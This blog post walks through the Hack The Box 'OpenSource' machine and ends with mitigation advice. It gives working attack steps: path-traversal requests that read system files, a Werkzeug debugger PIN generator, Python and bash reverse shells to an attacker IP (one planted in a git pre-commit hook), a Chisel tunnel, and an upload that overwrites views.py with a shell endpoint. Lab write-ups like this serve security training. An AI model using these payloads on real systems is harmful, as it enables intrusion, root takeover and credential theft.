---
layout: post
title: Hack The Box Walkthrough - OpenSource
date: 2022-06-04
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/06/HTB/OpenSource
img: 2022/06/OpenSource/OpenSource.png
---

This was a tough, but a fun machine. It's marked as easy, but I had a hard time and I learned a lot doing it.


* Room: OpenSource
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/OpenSource](https://app.hackthebox.com/machines/OpenSource)
* Author: [irogir](https://app.hackthebox.com/users/476556)

## Enumeration

I started the box by checking for opened ports.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.126.28:22
Open 10.129.126.28:80
...
```

I found two:

* 22 - SSH
* 80 - HTTP

## Upcloud

I launched a browser and looked at the website on port 80.

![Upcloud Site](/assets/images/2022/06/OpenSource/MainSite.png "Upcloud Site")

It was a file-sharing site. There were two interesting buttons at the bottom of the site. The first one allowed me to download the source code, and the second one to try the application.

I launched feroxbuster to check for other hidden files or folders.

```bash
➜  OpenSource
$ feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      131l      420w     5316c http://target.htb/
200      GET       45l      144w     1563c http://target.htb/console
200      GET     9803l    56722w  2489147c http://target.htb/download
[####################] - 13s     9426/9426    0s      found:3       errors:0
[####################] - 12s     4713/4713    372/s   http://target.htb
[####################] - 12s     4713/4713    374/s   http://target.htb/
```

It found `/console` that took me to a Flask debug console. But I needed a PIN to access it.

## File Uploads

I tried the file upload function of the site. 

![File Upload](/assets/images/2022/06/OpenSource/FileUpload.png "File Upload")

Once the file was uploaded, I could access it at `http://target.htb/uploads/FILE_NAME`. 

![Uploaded](/assets/images/2022/06/OpenSource/FileUploaded.png "Uploaded")

I tried uploading a Python file. It worked, but the file was returned as a text file. It was not executed on the server. 

I downloaded the source code for the application and looked at it. The zip file contained a git repository. I looked into the history of the repo and found a dev branch that contained some credentials in an earlier commit. 

```
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:REDACTED@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

I did not know what to do with them, but I kept them for later.

The code to upload and access uploaded files was interesting. It had some custom functions to prevent [Local File Inclusion (LFI)](https://en.wikipedia.org/wiki/File_inclusion_vulnerability).

```python
# views.py
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

# utils.py
"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""
def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension

"""
Recursively replace a pattern in a string
"""
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

The `get_unique_upload_name` was never called. So the only protection was to recursively remove `../` from the path. I tried bypassing that protection, but I couldn't find anything that worked. I checked on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) for more payload to try, but that failed also.

PayloadsAllTheThings was suggesting [DotDotPwn](https://github.com/wireghoul/dotdotpwn) to fuzz for directory traversal. I used it to read the hosts file on the server.

```bash
perl dotdotpwn.pl -m http-url -u http://target.htb/uploads/TRAVERSAL -x 80 -f /etc/hosts -k "localhost" -d 4 -t 200 -s
```

It found that I could use `..//` to read files on the server.

```
$ cat dotdotpwn/Reports/target.htb_05-30-2022_20-07.txt

[+] Date and Time: 05-30-2022 20:07:51

[========== TARGET INFORMATION ==========]
[+] Hostname: target.htb
[+] Protocol: http
[+] Port: 80
[+] Service detected:
Werkzeug/2.1.2 Python/3.10.3
[=========== TRAVERSAL ENGINE ===========]
[+] Traversal Engine DONE ! - Total traversal tests created: 3676

[+] Fuzz testing finished after 19.68 minutes (1181 seconds)
[+] Total Traversals found: 8
[+] Replacing "TRAVERSAL" with the traversals created and sending

[*] Testing URL: http://target.htb/uploads/..//etc//hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..//..//etc//hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..//..//..//etc//hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..//..//..//..//etc//hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..///etc///hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..///..///etc///hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..///..///..///etc///hosts <- VULNERABLE
[*] Testing URL: http://target.htb/uploads/..///..///..///..///etc///hosts <- VULNERABLE
```

I could use `../` follow by an absolute path to extract any file from the server.

```http
GET /uploads/..//etc/passwd HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 05 Jun 2022 00:50:50 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 1172
Last-Modified: Thu, 16 Sep 2021 19:13:31 GMT
Cache-Control: no-cache
ETag: "1631819611.0-1172-393413677"
Date: Sun, 05 Jun 2022 00:50:50 GMT
Connection: close

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

It took me quite a while to understand why this worked. The `recursive_replace` function was removing the `../` from the passed path, so it was becoming `/etc/passwd`. Witch should not work if appended to `/app/public/uploads/`. After [some research](https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/), I found that `os.path.join` ignore any previous part if a part starts by a `/`. So if `path` is `/etc/passwd`, then the call `os.path.join(os.getcwd(), "public", "uploads", path)` will only return the value of `path`.


## Getting the PIN 

I should probably have used the path traversal bug to rewrite one of the Python file and get a reverse shell. But instead, I tried to get the PIN for the Werkzeug Debugger console. I found [a post on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) that explained how to generate it, but it didn't work. The version of Flask was different, so there were probably small differences in how the PIN was generated. 

To generate the PIN, I used the LFI to extract some information for the server. 

First, I needed the code that is used by Flask to generate the PIN.

```http
GET /uploads/..//usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://target.htb/upcloud
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 01 Jun 2022 23:13:10 GMT
If-None-Match: "1654125190.8242395-12-2550991558"
```

I took this file and simplified it, keeping only code needed to generate the PIN. Then I extracted the other values I needed. 

To get the MAC address, I had to find the interface that was used. 

```http
GET /uploads/..//..//..//..//proc/net/arp HTTP/1.1
Host: target.htb
...
```

```
IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:7e:78:0f:46     *        eth0
```

Then I could get the MAC for this interface. 

```http
GET /uploads/..//sys/class/net/eth0/address HTTP/1.1
```

```
02:42:ac:11:00:09
```

I converted it to decimal so I could use it as the value for `node` in the script.

```python
>>> print(0x0242ac110009)
2485377892361
```

Next, I needed the value for the machine ID. This was the concatenation of values from two files. 


```http
GET /uploads/..//proc/sys/kernel/random/boot_id HTTP/1.1
Host: target.htb
```

```
7de8344f-479d-402f-aeae-23e4f0c9ab1e
```
And

```http
GET /uploads/..//proc/self/cgroup HTTP/1.1
Host: target.htb
```

```
12:freezer:/docker/c8ca454d258582d3e11e469d822a538f8a0aa4a96bcfd461cb3591ada9600164
11:cpuset:/docker/c8ca454d258582d3e11e469d822a538f8a0aa4a96bcfd461cb3591ada9600164
```

With this data, I had my script ready to generate the PIN. 

```python
import hashlib
from itertools import chain


node = '2485377892361'

def get_machine_id():
    linux = b""
    # GET /uploads/..//proc/sys/kernel/random/boot_id HTTP/1.1
    linux = b"7de8344f-479d-402f-aeae-23e4f0c9ab1e" 
    # GET /uploads/..//proc/self/cgroup HTTP/1.1
    linux += b"c8ca454d258582d3e11e469d822a538f8a0aa4a96bcfd461cb3591ada9600164"
    return linux

def get_pin_and_cookie_name():
    pin = ""
    rv = None
    num = None

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        'root',
        'flask.app',
        'Flask'
        '/usr/local/lib/python3.10/site-packages/flask/app.py'
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    
    private_bits = [node, get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name

print(get_pin_and_cookie_name()[0])
```

I ran the script. 

```bash
$ python generate_pin.py 
100-685-731
```

And I used the generated PIN to log in the console.

![Console](/assets/images/2022/06/OpenSource/Console.png "Console")



From there I could use Python to get a reverse shell.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.143",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```


```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.111.246 47276
/bin/sh: can't access tty; job control turned off
/app # whoami
root
/app #
```

## Getting Access to the Host Machine

I was in as root, but I was in a container. I needed to find a way to the main machine. I looked around the container but did not find anything I could use. I got LinPEAS on it, still nothing. 

Netcat was on the machine, so I wrote a small script to scan the host for opened ports. 

```python
import os

for i in range(65535):
        command = f"nc -v -z -n -w 1 172.17.0.1 {i}"
        os.system(command)
```

```bash
/tmp # python scan.py
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
172.17.0.1 (172.17.0.1:6004) open
172.17.0.1 (172.17.0.1:6005) open
172.17.0.1 (172.17.0.1:6006) open
172.17.0.1 (172.17.0.1:6007) open
```

Port 80 and 6000 to 6007 were web servers for the same app I already found. Just on different containers. 

Port 3000 was more interesting. 

```
tmp # nc 172.17.0.1 3000
GET / HTTP/1.1
Host: 172.17.0.1
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: i_like_gitea=74190fd626c44532; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: _csrf=0tuDhFAnT48O7MznGqBi3iGn2Gw6MTY1NDM0NDM3NDAyODkyNzU4Nw; Path=/; Expires=Sun, 05 Jun 2022 12:06:14 GMT; HttpOnly; SameSite=Lax
Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
X-Frame-Options: SAMEORIGIN
Date: Sat, 04 Jun 2022 12:06:14 GMT
Transfer-Encoding: chunked

3466
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto" />
        <meta name="author" content="Gitea - Git with a cup of tea" />
        <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
        <meta name="keywords" content="go,git,self-hosted,gitea">
        <meta name="referrer" content="no-referrer" />
...
```

It was serving [Gitea](https://gitea.io/en-us/), a hosted interface for git.


I found some exploits for it, but I failed to exploit them for the container. The exploits required `requests`to be installed. It was not and since the box did not have access to the internet, I could not install it. 

I was stuck here for a while. I could not easily interact with the site in Python without `requests`. I could have done everything through netcat, but that sounded painful. What I needed was an SSH tunnel that would allow me reach the site on port 3000 of the host from my machine. But I could not get a tunnel since I was in a reverse shell, not an SSH connection. 

I went to the [Hack The Box forum](https://forum.hackthebox.com/t/official-opensource-discussion/257694) for a hint. This is where I learned about [Chisel](https://github.com/jpillora/chisel). Chisel allows creating SSH tunnel over HTTP. It also can create reverse port forwarding where the connection starts at the server and get out on the client. This is what I needed since a server in the container would have been unreachable. 

I used this [post](https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683) as an example of how to build the tunnel.

I downloaded the binary on my machine and on the server. Then started the Chisel server on my machine.

```bash
$ ./chisel server -p 3477 --reverse
2022/06/05 07:28:10 server: Reverse tunnelling enabled
2022/06/05 07:28:10 server: Fingerprint 9yzcXS4jbXm4jt5HQGUAzOFkGgQ9x4vdrjKaDm6AlKk=
2022/06/05 07:28:10 server: Listening on http://0.0.0.0:3477

```

I launched the client in the container.


```bash
/tmp # ./chisel client 10.10.14.143:3477 R:2222:172.17.0.1:3000/tcp
2022/06/05 11:29:16 client: Connecting to ws://10.10.14.143:3477
2022/06/05 11:29:17 client: Connected (Latency 32.747099ms)
```

This command connected to the server on port 3477 in my machine. And opened a reverse proxy. Any TCP traffic on port 2222 on my machine would go to the tunnel and be forwarded to port 3000 on the host machine at 172.17.0.1.

I opened `http://localhost:2222/` in my browser and it reached Gitea.

![Gitea](/assets/images/2022/06/OpenSource/Gitea.png "Gitea")

I used the credentials I found in the source code to log in the site. There was one repository called `dev01/home-backup` and it contained a backup of dev01's SSH private key. I saved the copy on my machine and used it to connect to the server. 

```bash
$ chmod 600 dev01_id_rsa

$ ssh -i dev01_id_rsa dev01@target 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  5 11:37:52 UTC 2022

  System load:  0.02              Processes:              217
  Usage of /:   75.0% of 3.48GB   Users logged in:        0
  Memory usage: 21%               IP address for eth0:    10.129.101.0
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23

dev01@opensource:~$ ls 
user.txt

dev01@opensource:~$ cat user.txt 
REDACTED
```

## Getting root

Once connected, I looked around the server for ways to escalate my privileges. The user's home folder was a git repository. 

```bash
dev01@opensource:~$ ls -la
total 44
drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .
drwxr-xr-x 4 root  root  4096 May 16 12:51 ..
lrwxrwxrwx 1 dev01 dev01    9 Mar 23 01:21 .bash_history -> /dev/null
-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc
drwx------ 2 dev01 dev01 4096 May  4 16:35 .cache
drwxrwxr-x 8 dev01 dev01 4096 Jun  5 11:39 .git
...
```

Every time I made some changes in the home folder, a new commit would appear in the repository.

```
dev01@opensource:~$ git status                     
On branch main                                  
Your branch is ahead of 'origin/main' by 2 commits.
  (use "git push" to publish your local commits)
                                                          
nothing to commit, working tree clean

dev01@opensource:~$ touch test

dev01@opensource:~$ git status
On branch main
Your branch is ahead of 'origin/main' by 3 commits.
  (use "git push" to publish your local commits)

nothing to commit, working tree clean

dev01@opensource:~$ git log
commit 566d540d03d3bd004cfce9e028695a81e91f3989 (HEAD -> main)
Author: gituser <gituser@local>
Date:   Sun Jun 5 11:40:01 2022 +0000

    Backup for 2022-06-05

commit bde0a3b31753e03ec4989bcf6c283ca302b500f2
Author: gituser <gituser@local>
Date:   Sun Jun 5 10:52:01 2022 +0000

    Backup for 2022-06-05
...

dev01@opensource:~$ git diff bde0a3b31753e03ec4989bcf6c283ca302b500f2
diff --git a/test b/test
new file mode 100644
index 0000000..e69de29
...
```

It appeared that some script was committing any changes to the home folder in the repository. To find the script, I used `watch` and `ps` to try and see the running processes. 

```
dev01@opensource:~$ touch test2
dev01@opensource:~$ watch -n 0.5 -d "ps aux | grep git"
```

I waited until the minute changed and saw the script doing the backup run. 

![ps](/assets/images/2022/06/OpenSource/ps.png "ps")

The script `/usr/local/bin/git-sync` was being run by root. So if I could get it to run some custom code, I would be able to get root on the machine. 

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

The script did not do much. It checked for uncommitted changes in the repository. If it finds any, it would add them to them and commit them before pushing the changes. I did not have permission to modify the script. And there was no writable folder on the path that I could have used to replace which git executable was executed. 

In git, it's possible to use [hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to run some code when an action happens. I used the pre-commit hook to open a reverse shell whenever the script tried to commit changes to the repository.


```bash
dev01@opensource:~$ cat  .git/hooks/pre-commit
#!/bin/sh

bash -c 'bash -i >& /dev/tcp/10.10.14.143/4444 0>&1'
```

I started a netcat listener, created a new file on the server, and waited for the script to run.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.126.28 38750
bash: cannot set terminal process group (16813): Inappropriate ioctl for device
bash: no job control in this shell

root@opensource:/home/dev01# whoami
whoami
root

root@opensource:/home/dev01# cd /root
cd /root

root@opensource:~# cat root.txt
cat root.txt
REDACTED
```

## Mitigation

This was a very fun box to pwn. There was few opening that allowed me to gain access and escalate my privileges. 

The first big issue with the box was committing secrets to a repository. The source code contained the credentials of `dev01`. And the backup repository contained their private key. 

There should be safeguards against adding secrets:

* Add common file to .gitignore
* Use tools that scan for secrets in pre-commit hooks
* Look for them in code review 

Errors might still happen. If a password is committed, removing it like it was done in the application source code is not enough. The password needs to be changed because it is still part of the history. 

The problem with the LFI is a little harder. You need to really know your language to know about issues like the one in `os.path.join`. There are a few things that could be done to help with this issue. 

* Rename the file instead of using the name provided by the user
* Uploaded file information should be stored in a database. And only those files should be accessible. 
* In this code, making sure the filename does not start with a / would have helped

Another problem with the box is that the debug console was available. This should never be activated in production applications. This console allows running any Python code. And access anything that the application has access to. It could be useful to debug issues while developing the application, but there is no reason to deploy it anywhere public.

The last issue was the backup script. I'm not convinced that git is a good tool to run backups. But if they wanted to use it to keep snapshots, the script should have run as the user that is being backed up, not as root.

## Bonus - Using The Path Traversal To Get The Sell

When I did the box, I did a quick attempt to get a shell by uploading a Python file. I quickly pivoted to extracting the PIN to get the shell through the console instead. When I was done with the box, I decided to try the upload again.

I started by extracting the `views.py` file from the server to be sure I had the live version.

```http
GET /uploads/..//app/app/views.py HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```


I modified it to add a new `/shell` endpoint. 

```bash
@app.route('/shell')
def shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.143",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

    return render_template('index.html')
```


Then I uploaded the modified file. I used Burp to modify the filename and overwrite the code that was serving the application.

```http
POST /upcloud HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------246307162433279561281974372034
Content-Length: 1447
Origin: http://target.htb
Connection: close
Referer: http://target.htb/upcloud
Cookie: __wzdd1fca5944e3e586a8caa=1654426481|047d61f17eac
Upgrade-Insecure-Requests: 1

-----------------------------246307162433279561281974372034
Content-Disposition: form-data; name="file"; filename="..//app/app/views.py"
Content-Type: text/x-python

import socket,subprocess,os

...
```

Lastly, I started a netcat listener and navigated to http://target.htb/shell. 